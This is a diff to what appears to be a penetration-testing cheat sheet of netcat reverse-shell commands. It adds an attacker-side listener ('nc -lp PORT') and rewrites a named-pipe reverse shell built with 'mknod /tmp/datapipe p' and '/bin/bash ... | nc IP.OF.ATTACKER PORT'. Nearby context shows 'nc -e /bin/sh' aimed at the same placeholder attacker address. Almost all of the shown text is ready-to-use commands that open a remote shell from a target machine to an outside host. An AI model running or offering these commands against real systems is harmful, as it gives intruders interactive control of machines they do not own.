@@ -38,8 +38,11 @@ On target machine: nc -e /bin/sh IP.OF.ATTACKER PORT
 
 - When -e flag does not exist:
 ```
+On attacking machine: nc -lp PORT
+
+On target machine:
 mknod /tmp/datapipe p
-/bin/bash 0</tmp/datapipe | nc remote.host.com port 1>/tmp/datapipe
+/bin/bash 0</tmp/datapipe | nc IP.OF.ATTACKER PORT 1>/tmp/datapipe
 ```
 
 - Bind a shell to a port:
